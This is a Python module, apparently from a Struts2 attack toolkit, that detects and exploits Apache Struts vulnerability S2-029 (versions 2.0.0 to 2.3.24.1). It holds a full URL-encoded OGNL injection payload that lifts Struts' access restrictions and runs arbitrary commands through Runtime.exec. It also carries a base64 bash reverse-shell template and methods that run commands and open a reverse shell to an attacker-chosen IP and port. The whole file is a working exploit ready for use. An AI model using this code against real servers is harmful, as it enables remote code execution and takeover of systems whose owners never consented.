from exploit import tools
import urllib.parse

class S2_029:
    """S2-029漏洞检测利用类"""
    info = "[+] S2-029:影响版本Struts 2.0.0-2.3.24.1(除了2.3.20.3); GET请求发送数据,需要参数; 默认参数:message; 支持任意命令执行和反弹Linx shell"
    exec_payload = "(%23_memberAccess%5B'allowPrivateAccess'%5D%3Dtrue%2C%23_memberAccess%5B'allowProtectedAccess'%5D%3Dtrue%2C%23_memberAccess%5B'excludedPackageNamePatterns'%5D%3D%23_memberAccess%5B'acceptProperties'%5D%2C%23_memberAccess%5B'excludedClasses'%5D%3D%23_memberAccess%5B'acceptProperties'%5D%2C%23_memberAccess%5B'allowPackageProtectedAccess'%5D%3Dtrue%2C%23_memberAccess%5B'allowStaticMethodAccess'%5D%3Dtrue%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        if "?" in url:
            self.url = url.split("?")[0].strip()
        else:
            self.url = url
        if not data:
            self.data = "message={exp}"
        else:
            self.data = data
        self.headers = tools.parser_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        html = tools.echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-029'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        html = tools.get(self.url +"?" +self.data.format(exp=self.exec_payload.format(cmd=urllib.parse.quote(cmd))), self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = tools.reverse_shell(self, ip, port)
        return html

# if __name__ == '__main__':
#     s = S2_029("http://192.168.217.138:8080/S2-029/default.action")
#     print(s.check())
#     print(s.exec_cmd('ls -la'))
#     s.reverse_shell('192.168.3.134', '4444')